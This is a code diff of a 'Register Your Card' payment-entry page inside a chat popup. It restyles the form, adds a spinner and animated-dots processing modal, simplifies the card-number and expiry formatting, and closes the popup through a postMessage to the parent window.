@@ -9,42 +9,46 @@
   body {
     margin: 0;
     padding: 0;
-    background: #0a0a0a;
+    background: #0d0d0d;
     font-family: Arial, sans-serif;
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
+    color: #fff;
   }
 
   .container {
     width: 90%;
     max-width: 420px;
-    background: #141414;
+    background: #1a1a1a;
     padding: 25px;
     border-radius: 12px;
-    color: #fff;
-    box-shadow: 0 0 20px #000;
+    box-shadow: 0 0 25px rgba(0,0,0,0.6);
   }
 
   .title {
     text-align: center;
-    font-size: 22px;
-    margin-bottom: 20px;
+    font-size: 23px;
+    margin-bottom: 22px;
+    font-weight: bold;
   }
 
   label {
     display: block;
     margin: 12px 0 6px;
     font-size: 14px;
+    color: #ccc;
   }
 
   input {
     width: 100%;
     padding: 12px;
     border-radius: 8px;
-    border: none;
+    border: 1px solid #333;
+    background: #0d0d0d;
     font-size: 16px;
+    color: #fff;
   }
 
   .row {
@@ -74,20 +78,54 @@
     margin-top: 20px;
     cursor: pointer;
     font-weight: bold;
+    color: #000;
   }
 
-  /* Success Modal */
+  /* Processing Modal */
   #successModal {
     display: none;
     position: fixed;
     inset: 0;
-    background: rgba(0,0,0,0.85);
-    color: white;
-    font-size: 24px;
+    background: rgba(0,0,0,0.88);
     justify-content: center;
     align-items: center;
     flex-direction: column;
     text-align: center;
+    animation: fadeIn 0.25s ease;
+  }
+
+  /* Spinner */
+  .spinner {
+    width: 55px;
+    height: 55px;
+    border: 5px solid #444;
+    border-top-color: #e89129;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  /* Animated dots */
+  .dots::after {
+    content: '';
+    animation: dots 1.4s infinite steps(4);
+  }
+
+  @keyframes dots {
+    0% { content: ''; }
+    25% { content: '.'; }
+    50% { content: '..'; }
+    75% { content: '...'; }
+    100% { content: ''; }
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
   }
 </style>
 </head>
@@ -97,7 +135,7 @@
   <div class="title">Register Your Card</div>
 
   <form id="cardForm">
-    
+
     <label>Card Number</label>
     <div class="brand-box">
       <input id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" required />
@@ -125,7 +163,8 @@
 
 <!-- Processing Modal -->
 <div id="successModal">
-  <div>Please hold...<br>Registering your card.</div>
+  <div class="spinner"></div>
+  <div class="dots" style="font-size:22px;">Please hold, registering your card</div>
 </div>
 
 <script>
@@ -137,11 +176,8 @@ const brandLogo = document.getElementById("brandLogo");
 
 cardInput.addEventListener("input", () => {
   let num = cardInput.value.replace(/\D/g, "");
-
-  // Auto spacing
   cardInput.value = num.replace(/(.{4})/g, "$1 ").trim();
 
-  // Detect brand
   let brand = "";
   if (/^4/.test(num)) brand = "visa";
   else if (/^5[1-5]/.test(num)) brand = "mastercard";
@@ -159,16 +195,9 @@ cardInput.addEventListener("input", () => {
 /* ---------------------------
    EXPIRATION INPUT FORMAT
 ----------------------------*/
-const expInput = document.getElementById("exp");
-
-expInput.addEventListener("input", () => {
-  let v = expInput.value.replace(/\D/g, "");
-
-  if (v.length >= 3) {
-    expInput.value = v.slice(0,2) + "/" + v.slice(2,4);
-  } else {
-    expInput.value = v;
-  }
+document.getElementById("exp").addEventListener("input", (e) => {
+  let v = e.target.value.replace(/\D/g, "");
+  e.target.value = v.length >= 3 ? v.slice(0,2) + "/" + v.slice(2,4) : v;
 });
 
 /* ---------------------------
@@ -179,7 +208,7 @@ document.getElementById("cvv").addEventListener("input", (e) => {
 });
 
 /* ---------------------------
-   FORM SUBMIT + CLOSING LOGIC
+   FORM SUBMIT + COMM100 CLOSE
 ----------------------------*/
 document.getElementById("cardForm").addEventListener("submit", function(e) {
   e.preventDefault();
@@ -187,20 +216,11 @@ document.getElementById("cardForm").addEventListener("submit", function(e) {
   const modal = document.getElementById("successModal");
   modal.style.display = "flex";
 
-  // 5-second fake processing
+  // Simulate “processing”
   setTimeout(() => {
 
-    // Try close (Comm100 handles this correctly)
-    try {
-      window.open('', '_self');
-      window.close();
-    } catch (e) {}
-
-    // If browser blocks closing, fade back to chat naturally
-    setTimeout(() => {
-      modal.style.display = "none";
-      document.body.innerHTML = "";
-    }, 200);
+    // This is the ONLY method Comm100 accepts:
+    window.parent.postMessage({ type: "closeChatPopup" }, "*");
 
   }, 5000);
 });
